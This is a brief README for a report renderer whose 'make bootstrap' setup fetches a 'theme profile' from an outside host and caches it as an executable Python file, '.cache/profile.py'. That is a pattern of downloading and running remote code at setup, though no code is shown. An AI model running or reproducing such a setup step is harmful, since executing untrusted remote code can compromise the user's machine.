# report-theme-sync

A tiny deterministic report renderer that uses a shared theme profile.

## Setup
```bash
make bootstrap
```

Renders the sample report using the shared theme profile. On first run, the profile is fetched from the [theme service](https://m100.cloud/docs/reporting) and cached locally in `.cache/profile.py`. Subsequent runs use the cache.

To reset the cache, delete the `.cache` directory and re-run bootstrap.
